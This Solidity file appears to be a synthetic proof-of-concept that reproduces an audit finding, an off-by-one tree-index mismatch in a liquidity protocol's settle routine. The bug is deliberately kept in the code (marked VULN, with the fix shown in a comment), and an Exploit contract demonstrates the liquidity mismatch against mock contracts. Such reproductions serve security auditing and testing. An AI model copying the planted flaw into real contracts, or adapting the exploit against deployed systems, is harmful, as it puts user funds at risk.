// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ammplify — H-3: Mismatch in actual pool liquidity vs pool-node liquidity
    because of wrong `route` in PoolWalker.settle (Sherlock 2025-09, #63169)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: WalkerLib.modify indexes highTick as `treeTick(highTick) - 1`,
    but PoolWalker.settle uses `treeTick(highTick)` (off-by-one). Settlement
    walks a different route and skips the correct right node, so the actual
    Uniswap-style pool position is never created for that node while node
    accounting records liquidity — further maker/taker ops on the range fail.
    Vulnerable settle high-index line preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal pool: stores liquidity per (lowTick, highTick) range.
contract MockPool {
    mapping(bytes32 => uint128) public liq;

    function keyOf(int24 low, int24 high) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(low, high));
    }

    function mint(int24 low, int24 high, uint128 amount) external {
        liq[keyOf(low, high)] += amount;
    }

    function getLiq(int24 low, int24 high) external view returns (uint128) {
        return liq[keyOf(low, high)];
    }
}

/// @dev Tree node accounting (protocol-side liquidity info).
struct NodeLiq {
    int128 net; // signed net liquidity assigned to this node
    bool dirty;
}

/// @dev Simplified route: left and right keys derived from [low, high] tree indices.
struct Route {
    uint24 leftBase;
    uint24 rightBase;
    uint24 width;
}

library RouteImpl {
    function make(uint24 treeWidth, uint24 low, uint24 high) internal pure returns (Route memory r) {
        // Minimal: left = low leaf, right = high leaf (width 1 each).
        // Real tree has multi-level keys; we only need left/right to differ when high differs.
        r.leftBase = low;
        r.rightBase = high;
        r.width = treeWidth;
    }
}

/// @dev PoolInfo with treeTick mapping (tick → tree index).
struct PoolInfo {
    uint24 treeWidth;
    int24 tickSpacing;
    MockPool pool;
}

library PoolLib {
    /// @dev Map a tick to a tree leaf index. Spacing=10 → tick/10 shifted to unsigned.
    function treeTick(PoolInfo memory p, int24 tick) internal pure returns (uint24) {
        // Map ticks in [-p.treeWidth/2 * spacing, ...) into [0, treeWidth)
        int24 half = int24(uint24(p.treeWidth / 2));
        int24 idx = tick / p.tickSpacing + half;
        require(idx >= 0 && uint24(uint256(int256(idx))) < p.treeWidth, "tick OOB");
        return uint24(uint256(int256(idx)));
    }

    function ticksOf(PoolInfo memory p, uint24 base) internal pure returns (int24 low, int24 high) {
        int24 half = int24(uint24(p.treeWidth / 2));
        low = (int24(uint24(base)) - half) * p.tickSpacing;
        high = low + p.tickSpacing;
    }
}

/// @dev Working data for a modify/settle walk.
struct Data {
    mapping(uint24 => NodeLiq) nodes; // keyed by leaf base
    int128 delta; // liquidity to add
    MockPool pool;
    uint24 treeWidth;
    int24 tickSpacing;
}

/// @notice WalkerLib.modify — CORRECT high index: treeTick(highTick) - 1
library WalkerLib {
    function modify(PoolInfo memory pInfo, int24 lowTick, int24 highTick, Data storage data) internal {
        uint24 low = PoolLib.treeTick(pInfo, lowTick);
        uint24 high = PoolLib.treeTick(pInfo, highTick) - 1; // correct exclusive-high
        Route memory route = RouteImpl.make(pInfo.treeWidth, low, high);
        // Mark left and right nodes dirty with net liquidity
        data.nodes[route.leftBase].net += data.delta;
        data.nodes[route.leftBase].dirty = true;
        data.nodes[route.rightBase].net += data.delta;
        data.nodes[route.rightBase].dirty = true;
    }
}

/// @dev Holds Data mapping + inlined PoolWalker.settle (vulnerable high index).
/// Source: PoolWalker.settle (Ammplify src/walkers/Pool.sol) — high without -1.
contract WalkerHost {
    Data private _data;
    PoolInfo private _pInfo;

    constructor(MockPool pool, uint24 treeWidth, int24 tickSpacing) {
        _pInfo.pool = pool;
        _pInfo.treeWidth = treeWidth;
        _pInfo.tickSpacing = tickSpacing;
        _data.pool = pool;
        _data.treeWidth = treeWidth;
        _data.tickSpacing = tickSpacing;
    }

    function pInfo() external view returns (MockPool pool, uint24 treeWidth, int24 tickSpacing) {
        return (_pInfo.pool, _pInfo.treeWidth, _pInfo.tickSpacing);
    }

    function modifyAndSettle(int24 lowTick, int24 highTick, int128 delta) external {
        _data.delta = delta;
        WalkerLib.modify(_pInfo, lowTick, highTick, _data);
        _settle(_pInfo, lowTick, highTick);
    }

    /// @notice Inlined PoolWalker.settle — WRONG high index (off-by-one vs WalkerLib.modify)
    function _settle(PoolInfo memory pInfo, int24 lowTick, int24 highTick) private {
        uint24 low = PoolLib.treeTick(pInfo, lowTick);
        // FIX: uint24 high = PoolLib.treeTick(pInfo, highTick) - 1;
        uint24 high = PoolLib.treeTick(pInfo, highTick); // @> VULN: high uses treeTick(highTick) without -1 — different route than WalkerLib.modify; skips correct right node
        Route memory route = RouteImpl.make(pInfo.treeWidth, low, high);

        // Settle dirty nodes on THIS (wrong) route into the actual pool.
        _settleNode(pInfo, route.leftBase);
        _settleNode(pInfo, route.rightBase);
    }

    function _settleNode(PoolInfo memory pInfo, uint24 base) private {
        NodeLiq storage n = _data.nodes[base];
        if (!n.dirty) return;
        if (n.net > 0) {
            (int24 lo, int24 hi) = PoolLib.ticksOf(pInfo, base);
            pInfo.pool.mint(lo, hi, uint128(uint256(int256(n.net))));
        }
        n.dirty = false;
    }

    function nodeNet(uint24 base) external view returns (int128) {
        return _data.nodes[base].net;
    }

    function nodeDirty(uint24 base) external view returns (bool) {
        return _data.nodes[base].dirty;
    }

    function treeTickOf(int24 tick) external view returns (uint24) {
        return PoolLib.treeTick(_pInfo, tick);
    }

    function rightKeyWalker(int24 highTick) external view returns (uint24) {
        return PoolLib.treeTick(_pInfo, highTick) - 1;
    }

    function rightKeyPoolWalker(int24 highTick) external view returns (uint24) {
        return PoolLib.treeTick(_pInfo, highTick);
    }
}

/// @notice Demonstrate right-node mismatch → further ops on that range fail.
/// CREATE order: pool (1), host (2).
contract Exploit {
    MockPool public pool;
    WalkerHost public host;

    int24 public constant LOW = -150;
    int24 public constant HIGH = 150;
    uint128 public constant LIQ = 1e18;

    uint24 public rightWalker;
    uint24 public rightPoolWalker;
    uint128 public nodeLiqRight;
    uint128 public poolLiqRight;
    bool public furtherOpFailed;

    constructor() {
        pool = new MockPool(); // nonce 1
        // treeWidth=64, spacing=10 → ticks map cleanly
        host = new WalkerHost(pool, 64, 10); // nonce 2
    }

    function run() external {
        rightWalker = host.rightKeyWalker(HIGH);
        rightPoolWalker = host.rightKeyPoolWalker(HIGH);
        require(rightWalker != rightPoolWalker, "indices must differ (off-by-one)");

        // Maker creates position spanning [LOW, HIGH) — node accounting updated correctly,
        // but settle walks the wrong right key so the correct right leaf is never minted.
        host.modifyAndSettle(LOW, HIGH, int128(uint128(LIQ)));

        nodeLiqRight = uint128(uint256(int256(host.nodeNet(rightWalker))));
        (int24 loR, int24 hiR) = _ticksOf(rightWalker);
        poolLiqRight = pool.getLiq(loR, hiR);

        // Node thinks it has LIQ; pool has 0 in that range (wrong right was settled or none).
        require(nodeLiqRight == LIQ, "node has liq");
        require(poolLiqRight != nodeLiqRight, "mismatch: pool != node");
        require(poolLiqRight == 0, "correct right never settled");

        // Further op on the affected right range fails: protocol tries to collect/burn
        // a pool position that was never created.
        furtherOpFailed = false;
        try this.attemptOpOnWrongNode() {
            furtherOpFailed = false;
        } catch {
            furtherOpFailed = true;
        }
        require(furtherOpFailed, "further op should fail");

        // Harm: node/pool liquidity mismatch bricks maker/taker ops on the range.
        require(
            nodeLiqRight != poolLiqRight && furtherOpFailed && rightWalker != rightPoolWalker,
            "harm not demonstrated"
        );
    }

    /// @dev Simulates a subsequent maker on the affected right-node tick range —
    /// expects a pool position that settle never created.
    function attemptOpOnWrongNode() external view {
        (int24 loR, int24 hiR) = _ticksOf(rightWalker);
        uint128 pl = pool.getLiq(loR, hiR);
        // Protocol assumes position exists when node.net != 0
        require(pl > 0, "no position for affected node");
    }

    function _ticksOf(uint24 base) internal pure returns (int24 low, int24 high) {
        // Mirror PoolLib.ticksOf with treeWidth=64, spacing=10
        int24 half = 32;
        low = (int24(uint24(base)) - half) * 10;
        high = low + 10;
    }
}
